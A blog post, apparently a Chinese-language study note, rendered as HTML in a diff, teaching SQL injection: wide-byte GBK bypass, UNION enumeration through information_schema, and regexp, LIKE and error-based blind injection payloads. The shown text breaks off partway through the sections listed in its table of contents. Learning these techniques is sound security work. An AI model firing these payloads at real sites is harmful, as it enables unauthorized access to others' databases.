@@ -1,0 +1,995 @@
+<!DOCTYPE html>
+<html style="display: none;" >
+    <head>
+    <meta charset="utf-8">
+    <!--
+        © Material Theme
+        https://github.com/viosey/hexo-theme-material
+        Version: 1.5.2 -->
+    <script>
+        window.materialVersion = "1.5.2"
+        // Delete localstorage with these tags
+        window.oldVersion = [
+            'codestartv1',
+            '1.3.4',
+            '1.4.0',
+            '1.4.0b1',
+            '1.5.0'
+        ]
+    </script>
+
+    <!-- dns prefetch -->
+    <meta http-equiv="x-dns-prefetch-control" content="on">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <!-- Meta & Info -->
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+    <!-- Title -->
+    
+    <title>
+        
+            0x01 SQL注入篇 | 
+        
+        张Mini
+    </title>
+
+    <!-- Favicons -->
+    <link rel="icon shortcut" type="image/ico" href="/img/favicon.png">
+    <link rel="icon" href="/img/favicon.png">
+
+    <meta name="format-detection" content="telephone=no"/>
+    <meta name="description" itemprop="description" content="">
+    <meta name="keywords" content=",Web">
+    <meta name="theme-color" content="#535353">
+
+    <!-- Disable Fucking Bloody Baidu Tranformation -->
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+
+    <!--[if lte IE 9]>
+        <link rel="stylesheet" href="/css/ie-blocker.css">
+
+        
+            <script src="/js/ie-blocker.en.js"></script>
+        
+    <![endif]-->
+
+    <!-- Import lsloader -->
+    <script>(function(){window.lsloader={jsRunSequence:[],jsnamemap:{},cssnamemap:{}};lsloader.removeLS=function(a){try{localStorage.removeItem(a)}catch(b){}};lsloader.setLS=function(a,c){try{localStorage.setItem(a,c)}catch(b){}};lsloader.getLS=function(a){var c="";try{c=localStorage.getItem(a)}catch(b){c=""}return c};versionString="/*"+(window.materialVersion||"unknownVersion")+"*/";lsloader.clean=function(){try{var b=[];for(var a=0;a<localStorage.length;a++){b.push(localStorage.key(a))}b.forEach(function(e){var f=lsloader.getLS(e);if(window.oldVersion){var d=window.oldVersion.reduce(function(g,h){return g||f.indexOf("/*"+h+"*/")!==-1},false);if(d){lsloader.removeLS(e)}}})}catch(c){}};lsloader.clean();lsloader.load=function(f,a,b,d){if(typeof b==="boolean"){d=b;b=undefined}d=d||false;b=b||function(){};var e;e=this.getLS(f);if(e&&e.indexOf(versionString)===-1){this.removeLS(f);this.requestResource(f,a,b,d);return}if(e){var c=e.split(versionString)[0];if(c!=a){console.log("reload:"+a);this.removeLS(f);this.requestResource(f,a,b,d);return}e=e.split(versionString)[1];if(d){this.jsRunSequence.push({name:f,code:e});this.runjs(a,f,e)}else{document.getElementById(f).appendChild(document.createTextNode(e));b()}}else{this.requestResource(f,a,b,d)}};lsloader.requestResource=function(b,e,a,c){var d=this;if(c){this.iojs(e,b,function(h,f,g){d.setLS(f,h+versionString+g);d.runjs(h,f,g)})}else{this.iocss(e,b,function(f){document.getElementById(b).appendChild(document.createTextNode(f));d.setLS(b,e+versionString+f)},a)}};lsloader.iojs=function(d,b,g){var a=this;a.jsRunSequence.push({name:b,code:""});try{var f=new XMLHttpRequest();f.open("get",d,true);f.onreadystatechange=function(){if(f.readyState==4){if((f.status>=200&&f.status<300)||f.status==304){if(f.response!=""){g(d,b,f.response);return}}a.jsfallback(d,b)}};f.send(null)}catch(c){a.jsfallback(d,b)}};lsloader.iocss=function(f,c,h,a){var b=this;try{var g=new XMLHttpRequest();g.open("get",f,true);g.onreadystatechange=function(){if(g.readyState==4){if((g.status>=200&&g.status<300)||g.status==304){if(g.response!=""){h(g.response);a();return}}b.cssfallback(f,c,a)}};g.send(null)}catch(d){b.cssfallback(f,c,a)}};lsloader.iofonts=function(f,c,h,a){var b=this;try{var g=new XMLHttpRequest();g.open("get",f,true);g.onreadystatechange=function(){if(g.readyState==4){if((g.status>=200&&g.status<300)||g.status==304){if(g.response!=""){h(g.response);a();return}}b.cssfallback(f,c,a)}};g.send(null)}catch(d){b.cssfallback(f,c,a)}};lsloader.runjs=function(f,c,e){if(!!c&&!!e){for(var b in this.jsRunSequence){if(this.jsRunSequence[b].name==c){this.jsRunSequence[b].code=e}}}if(!!this.jsRunSequence[0]&&!!this.jsRunSequence[0].code&&this.jsRunSequence[0].status!="failed"){var a=document.createElement("script");a.appendChild(document.createTextNode(this.jsRunSequence[0].code));a.type="text/javascript";document.getElementsByTagName("head")[0].appendChild(a);this.jsRunSequence.shift();if(this.jsRunSequence.length>0){this.runjs()}}else{if(!!this.jsRunSequence[0]&&this.jsRunSequence[0].status=="failed"){var d=this;var a=document.createElement("script");a.src=this.jsRunSequence[0].path;a.type="text/javascript";this.jsRunSequence[0].status="loading";a.onload=function(){d.jsRunSequence.shift();if(d.jsRunSequence.length>0){d.runjs()}};document.body.appendChild(a)}}};lsloader.tagLoad=function(b,a){this.jsRunSequence.push({name:a,code:"",path:b,status:"failed"});this.runjs()};lsloader.jsfallback=function(c,b){if(!!this.jsnamemap[b]){return}else{this.jsnamemap[b]=b}for(var a in this.jsRunSequence){if(this.jsRunSequence[a].name==b){this.jsRunSequence[a].code="";this.jsRunSequence[a].status="failed";this.jsRunSequence[a].path=c}}this.runjs()};lsloader.cssfallback=function(e,c,b){if(!!this.cssnamemap[c]){return}else{this.cssnamemap[c]=1}var d=document.createElement("link");d.type="text/css";d.href=e;d.rel="stylesheet";d.onload=d.onerror=b;var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(d,a)};lsloader.runInlineScript=function(c,b){var a=document.getElementById(b).innerText;this.jsRunSequence.push({name:c,code:a});this.runjs()}})();</script>
+
+    <!-- Import queue -->
+    <script>function Queue(){this.dataStore=[];this.offer=b;this.poll=d;this.execNext=a;this.debug=false;this.startDebug=c;function b(e){if(this.debug){console.log("Offered a Queued Function.")}if(typeof e==="function"){this.dataStore.push(e)}else{console.log("You must offer a function.")}}function d(){if(this.debug){console.log("Polled a Queued Function.")}return this.dataStore.shift()}function a(){var e=this.poll();if(e!==undefined){if(this.debug){console.log("Run a Queued Function.")}e()}}function c(){this.debug=true}}var queue=new Queue();</script>
+
+    <!-- Import CSS -->
+    
+        <style id="material_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("material_css","/css/material.min.css?Z7a72R1E4SxzBKR/WGctOA==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+        <style id="style_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("style_css","/css/style.min.css?MKetZV3cUTfDxvMffaOezg==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+
+        
+
+    
+
+    
+
+    <!-- Config CSS -->
+
+<!-- Other Styles -->
+<style>
+  body, html {
+    font-family: Roboto, "Helvetica Neue", Helvetica, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", "微软雅黑", Arial, sans-serif;
+    overflow-x: hidden !important;
+  }
+  
+  code {
+    font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;
+  }
+
+  a {
+    color: #00838F;
+  }
+
+  .mdl-card__media,
+  #search-label,
+  #search-form-label:after,
+  #scheme-Paradox .hot_tags-count,
+  #scheme-Paradox .sidebar_archives-count,
+  #scheme-Paradox .sidebar-colored .sidebar-header,
+  #scheme-Paradox .sidebar-colored .sidebar-badge{
+    background-color: #535353 !important;
+  }
+
+  /* Sidebar User Drop Down Menu Text Color */
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:hover,
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:focus {
+    color: #535353 !important;
+  }
+
+  #post_entry-right-info,
+  .sidebar-colored .sidebar-nav li:hover > a,
+  .sidebar-colored .sidebar-nav li:hover > a i,
+  .sidebar-colored .sidebar-nav li > a:hover,
+  .sidebar-colored .sidebar-nav li > a:hover i,
+  .sidebar-colored .sidebar-nav li > a:focus i,
+  .sidebar-colored .sidebar-nav > .open > a,
+  .sidebar-colored .sidebar-nav > .open > a:hover,
+  .sidebar-colored .sidebar-nav > .open > a:focus,
+  #ds-reset #ds-ctx .ds-ctx-entry .ds-ctx-head a {
+    color: #535353 !important;
+  }
+
+  .toTop {
+    background: #757575 !important;
+  }
+
+  .material-layout .material-post>.material-nav,
+  .material-layout .material-index>.material-nav,
+  .material-nav a {
+    color: #757575;
+  }
+
+  #scheme-Paradox .MD-burger-layer {
+    background-color: #757575;
+  }
+
+  #scheme-Paradox #post-toc-trigger-btn {
+    color: #757575;
+  }
+
+  .post-toc a:hover {
+    color: #00838F;
+    text-decoration: underline;
+  }
+
+</style>
+
+
+<!-- Theme Background Related-->
+
+    <style>
+      body{
+        background-image: url(/img/bg.png);
+      }
+    </style>
+
+
+
+
+<!-- Fade Effect -->
+
+    <style>
+      .fade {
+        transition: all 800ms linear;
+        -webkit-transform: translate3d(0,0,0);
+        -moz-transform: translate3d(0,0,0);
+        -ms-transform: translate3d(0,0,0);
+        -o-transform: translate3d(0,0,0);
+        transform: translate3d(0,0,0);
+        opacity: 1;
+      }
+
+      .fade.out{
+        opacity: 0;
+      }
+    </style>
+
+
+<!-- Import Font -->
+<!-- Import Roboto -->
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500" rel="stylesheet">
+
+
+<!-- Import Material Icons -->
+
+
+    <style id="material_icons"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("material_icons","/css/material-icons.css?pqhB/Rd/ab0H2+kZp0RDmw==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+
+
+
+
+    <!-- Import jQuery -->
+    
+        <script>lsloader.load("jq_js","/js/jquery.min.js?qcusAULNeBksqffqUM2+Ig==", true)</script>
+    
+
+    <!-- WebAPP Icons -->
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="application-name" content="张Mini">
+    <meta name="msapplication-starturl" content="http://yoursite.com/2018/05/24/1/">
+    <meta name="msapplication-navbutton-color" content="#535353">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-title" content="张Mini">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon" href="/img/favicon.png">
+
+    <!-- Site Verification -->
+    
+    
+
+    <!-- RSS -->
+    
+
+    <!-- The Open Graph protocol -->
+    <meta property="og:url" content="http://yoursite.com/2018/05/24/1/">
+    <meta property="og:type" content="blog">
+    <meta property="og:title" content="0x01 SQL注入篇 | 张Mini">
+    <meta property="og:image" content="/img/favicon.png">
+    <meta property="og:description" content="">
+    <meta property="og:article:tag" content="Web"> 
+
+    
+        <meta property="article:published_time" content="Thu May 24 2018 00:43:23 GMT+0800">
+        <meta property="article:modified_time" content="Thu May 24 2018 00:45:08 GMT+0800">
+    
+
+    <!-- The Twitter Card protocol -->
+    <meta name="twitter:card" content="summary_large_image">
+
+    <!-- Add canonical link for SEO -->
+    
+        <link rel="canonical" href="http://yoursite.com/2018/05/24/1/index.html" />
+    
+
+    <!-- Structured-data for SEO -->
+    
+        
+
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "BlogPosting",
+    "mainEntityOfPage": "http://yoursite.com/2018/05/24/1/index.html",
+    "headline": "0x01 SQL注入篇",
+    "datePublished": "Thu May 24 2018 00:43:23 GMT+0800",
+    "dateModified": "Thu May 24 2018 00:45:08 GMT+0800",
+    "author": {
+        "@type": "Person",
+        "name": "张Mini",
+        "image": {
+            "@type": "ImageObject",
+            "url": "/img/avatar.png"
+        },
+        "description": "张Mini"
+    },
+    "publisher": {
+        "@type": "Organization",
+        "name": "张Mini",
+        "logo": {
+            "@type":"ImageObject",
+            "url": "/img/favicon.png"
+        }
+    },
+    "keywords": ",Web",
+    "description": "",
+}
+</script>
+
+
+    
+
+    <!-- Analytics -->
+    
+    
+    
+
+    <!-- Custom Head -->
+    
+
+</head>
+
+
+    
+        <body id="scheme-Paradox" class="lazy">
+            <div class="material-layout  mdl-js-layout has-drawer is-upgraded">
+                
+
+                <!-- Main Container -->
+                <main class="material-layout__content" id="main">
+
+                    <!-- Top Anchor -->
+                    <div id="top"></div>
+
+                    
+                        <!-- Hamburger Button -->
+                        <button class="MD-burger-icon sidebar-toggle">
+                            <span class="MD-burger-layer"></span>
+                        </button>
+                    
+
+                    <!-- Post TOC -->
+
+    
+    <!-- Back Button -->
+    <!--
+    <div class="material-back" id="backhome-div" tabindex="0">
+        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
+           href="#" onclick="window.history.back();return false;"
+           target="_self"
+           role="button"
+           data-upgraded=",MaterialButton,MaterialRipple">
+            <i class="material-icons" role="presentation">arrow_back</i>
+            <span class="mdl-button__ripple-container">
+                <span class="mdl-ripple"></span>
+            </span>
+        </a>
+    </div>
+    -->
+
+
+    <!-- Left aligned menu below button -->
+    
+    
+    <button id="post-toc-trigger-btn"
+        class="mdl-button mdl-js-button mdl-button--icon">
+        <i class="material-icons">format_list_numbered</i>
+    </button>
+
+    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#SQL注入篇"><span class="post-toc-number">1.</span> <span class="post-toc-text">SQL注入篇</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#宽字节注入"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">宽字节注入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#UNION联合注入"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">UNION联合注入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#盲注"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">盲注</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#正则注入"><span class="post-toc-number">1.3.1.</span> <span class="post-toc-text">正则注入</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#LIKE匹配注入"><span class="post-toc-number">1.3.2.</span> <span class="post-toc-text">LIKE匹配注入</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#基于报错的盲注"><span class="post-toc-number">1.3.3.</span> <span class="post-toc-text">基于报错的盲注</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#exp进行SQL报错注入"><span class="post-toc-number">1.3.4.</span> <span class="post-toc-text">exp进行SQL报错注入</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#bigint溢出"><span class="post-toc-number">1.3.5.</span> <span class="post-toc-text">bigint溢出</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#延时注入"><span class="post-toc-number">1.3.6.</span> <span class="post-toc-text">延时注入</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#导入导出相关操作"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">导入导出相关操作</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#load-file-导出文件"><span class="post-toc-number">1.4.1.</span> <span class="post-toc-text">load_file()导出文件</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#文件导入到数据库"><span class="post-toc-number">1.4.2.</span> <span class="post-toc-text">文件导入到数据库</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#导入到文件"><span class="post-toc-number">1.4.3.</span> <span class="post-toc-text">导入到文件</span></a></li></ol></li></ol></li></ol>
+    </ul>
+    
+
+
+
+
+<!-- Layouts -->
+
+    <!-- Post Module -->
+    <div class="material-post_container">
+
+        <div class="material-post mdl-grid">
+            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
+
+                <!-- Post Header(Thumbnail & Title) -->
+                
+    <!-- Paradox Post Header -->
+    
+        
+            <!-- Random Thumbnail -->
+            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
+            <script type="text/ls-javascript" id="post-thumbnail-script">
+    var randomNum = Math.floor(Math.random() * 19 + 1);
+
+    $('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
+    $('.post_thumbnail-random').addClass('lazy');
+</script>
+
+        
+    
+            <p class="article-headline-p">
+                0x01 SQL注入篇
+            </p>
+        </div>
+
+
+
+
+
+                
+                    <!-- Paradox Post Info -->
+                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">
+
+    <!-- Author Avatar -->
+    <div id="author-avatar">
+        <img src="/img/avatar.png" width="44px" height="44px" alt="Author Avatar"/>
+    </div>
+    <!-- Author Name & Date -->
+    <div>
+        <strong>张Mini</strong>
+        <span>May 24, 2018</span>
+    </div>
+
+    <div class="section-spacer"></div>
+
+    <!-- Favorite -->
+    <!--
+        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
+            <i class="material-icons" role="presentation">favorite</i>
+            <span class="visuallyhidden">favorites</span>
+        </button>
+    -->
+
+    <!-- Qrcode -->
+    
+
+    <!-- Tags (bookmark) -->
+    
+    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+        <i class="material-icons" role="presentation">bookmark</i>
+        <span class="visuallyhidden">bookmark</span>
+    </button>
+    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
+        <li class="mdl-menu__item">
+        <a class="post_tag-link" href="/tags/Web/">Web</a>
+    </ul>
+    
+
+    <!-- Share -->
+    
+        <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">share</i>
+    <span class="visuallyhidden">share</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
+    
+
+    
+
+    <!-- Share Weibo -->
+    
+
+    <!-- Share Twitter -->
+    
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=0x01 SQL注入篇&url=http://yoursite.com/2018/05/24/1/index.html&via=张Mini" target="_blank">
+            <li class="mdl-menu__item">
+                شارك على Twitter
+            </li>
+        </a>
+    
+
+    <!-- Share Facebook -->
+    
+
+    <!-- Share Google+ -->
+    
+
+    <!-- Share LinkedIn -->
+    
+
+    <!-- Share QQ -->
+    
+
+    <!-- Share Telegram -->
+    
+</ul>
+
+    
+</div>
+
+                
+
+                <!-- Post Content -->
+                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
+    
+        <h1 id="SQL注入篇"><a href="#SQL注入篇" class="headerlink" title="SQL注入篇"></a>SQL注入篇</h1><hr>
+<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>PHP中存在一个函数addslashes(),它的作用是返回预定义字符之前添加反斜杠<br><br>预定义字符:</p>
+<ul>
+<li>单引号(‘)</li>
+<li>双引号(“)</li>
+<li>反斜杠(\)</li>
+</ul>
+<p>既然说到了addslashes()函数，就不得不提另一个函数<br>stripslashes():它的作用就是删除由addslashes()函数添加的反斜杠</p>
+<p>因此有了addslashes()函数，用户所输入的” ‘ “等都会被转义成为” \’ “，从而在一定程度上避免SQL注入的发生</p>
+<p>但是，由于GBK编码的问题，当用户的输入为”%df’”</p>
+<p>那么，%df就会与\结合，从而达到闭合单引号的目的</p>
+<h2 id="UNION联合注入"><a href="#UNION联合注入" class="headerlink" title="UNION联合注入"></a>UNION联合注入</h2><p>无论是数字型注入还是字符型注入，使用UNION联合查询时大概思路都是一样的</p>
+<p>在学习UNION联合注入前，我们先了解几个可能用到的函数</p>
+<ul>
+<li>concat(str1,str2,…)</li>
+</ul>
+<p>连接参数产生的字符串</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">concat</span>(<span class="keyword">id</span>,<span class="string">','</span>,<span class="keyword">name</span>) <span class="keyword">as</span> con <span class="keyword">from</span> info <span class="keyword">limit</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>group_concat(str1,str2,…)</li>
+</ul>
+<p>连接一个组所有的字符串，以逗号分割</p>
+<ul>
+<li>concat_ws(separator,str1,str2,…)<br><br>含有分割符的连接字符串<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">concat_ws</span>(<span class="string">'_'</span>,<span class="keyword">id</span>,<span class="keyword">name</span>) <span class="keyword">as</span> con_ws <span class="keyword">from</span> info <span class="keyword">limit</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>由于mysql中有一个系统数据库information_schema<br>可以利用该表进行完整的注入。一般流程:</p>
+<ul>
+<li><ol>
+<li>猜数据库<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0' union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata),<span class="number">3</span>,<span class="number">4</span> #</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</li>
+</ul>
+<p>或者<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="number">3</span>,<span class="number">4</span> #</span><br></pre></td></tr></table></figure></p>
+<ol start="2">
+<li><p>猜某库的数据表</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0' union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">"xxxx"</span>),<span class="number">3</span>,<span class="number">4</span> #</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>猜某表的列</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0' union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">"xxxx"</span>),<span class="number">3</span>,<span class="number">4</span> #</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>盲注就是sql语句执行的选择后选择的数据不能回显到前端页面<br>所以我们需要利用一些方法进行判断</p>
+<p>盲注可分为:</p>
+<ul>
+<li>基于布尔的SQL盲注</li>
+<li>基于时间的SQL盲注</li>
+<li>基于报错的SQL盲注</li>
+</ul>
+<p>在介绍盲注前先熟悉一下经常用到截取字符串的几个函数:</p>
+<ol>
+<li>mid()</li>
+</ol>
+<p>mid(database(),1,1)&gt;’a’ //查看数据库名第一位<br>mid(database(),2,1)  //查看第二位</p>
+<p>mid((select table_name from information_schema.tables where table_schema=”xxx” limit 0,1),1,1)&gt;’a’    //判断第一个数据表的第一位是否&gt;’a’</p>
+<ol start="2">
+<li>substr()</li>
+</ol>
+<p>substr(database(),1,1)&gt;’a’  //判断数据库第一位</p>
+<p>substr((select table_name from information_schema.tables where table_schema=”xxx” limit 0,1),1,1)&gt;’a’   //判断第一个数据表的第一位</p>
+<ol start="3">
+<li>left()</li>
+</ol>
+<p>得到字符串左部指定个数的字符串</p>
+<p>left(string,n) string为截取的字符串，n为长度</p>
+<p>left(database(),1)&gt;’a’  //查看数据库第一位<br>left(database(),2)  //查看数据库前两位</p>
+<p>接下来学习一些盲注的方法</p>
+<h3 id="正则注入"><a href="#正则注入" class="headerlink" title="正则注入"></a>正则注入</h3><p>判断数据库可以:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1' and 1=(<span class="keyword">select</span> <span class="keyword">database</span>() regexp <span class="string">'^[a-e]'</span>) #    //判断第一个字符是[a-e]中的字符</span><br><span class="line"><span class="number">1</span><span class="string">' and 1=(select database() regexp '</span>^d<span class="string">') #        //确定第一个字符是d</span></span><br><span class="line"><span class="string">1'</span> <span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> <span class="keyword">database</span>() regexp <span class="string">'^d[u-w]'</span>) #   //判断第二个字符是[u-w]中的字符</span><br></pre></td></tr></table></figure></p>
+<p>之后就可以依次更换：’^dv[a-z]’ -&gt; ‘^dvw[a-z]’ -&gt; ‘^dvwa[a-z]’来确定数据库名</p>
+<p>判断数据表可以:</p>
+<ol>
+<li>判断第一个表名的第一个字符是否为a-z中的字符</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id=1 and 1=(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">"xxx"</span> <span class="keyword">and</span> table_name regexp <span class="string">'^[a-z]'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>缩小范围继续判断</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id=1 and 1=(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">"xxx"</span> <span class="keyword">and</span> table_name regexp <span class="string">'^[a-n]'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li><p>确定第一个字符</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id=1 and 1=(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">"xxx"</span> <span class="keyword">and</span> table_name regexp <span class="string">'^n'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>表达式更换</p>
+</li>
+</ol>
+<p>‘^n[a-z]’ -&gt; ‘^ne[a-z]’ -&gt; ‘^new[a-z]’ -&gt; ‘^news[a-z]’ -&gt; FALSE</p>
+<p>(这时说明表名为news,验证是否是该表名，正则表达式是’^news$’，但是没必要，可以直接判断 table_name=’news’)</p>
+<ol start="5">
+<li>猜测其它表</li>
+</ol>
+<p>这里注意不能直接修改 limit 1,1 -&gt; limit 2,1</p>
+<p>因为regexp会对所有项匹配</p>
+<p>判断列名也类似</p>
+<h3 id="LIKE匹配注入"><a href="#LIKE匹配注入" class="headerlink" title="LIKE匹配注入"></a>LIKE匹配注入</h3><p>和正则类似，mysql 在匹配时可以用like进行匹配</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">like</span> <span class="string">'ro%'</span></span><br><span class="line"><span class="number">1</span><span class="string">' and 1=(select database() like '</span>dv%<span class="string">') #     //猜测数据库前两位为'</span>dv<span class="string">'</span></span><br></pre></td></tr></table></figure>
+<h3 id="基于报错的盲注"><a href="#基于报错的盲注" class="headerlink" title="基于报错的盲注"></a>基于报错的盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)))a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a;</span><br><span class="line">(此处三个点:一是需要concat计数，二是floor，取得0 or 1，进行数据的重复，三是group by 进行分组)</span><br></pre></td></tr></table></figure>
+<p>可简化为如下形式<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))</span><br></pre></td></tr></table></figure></p>
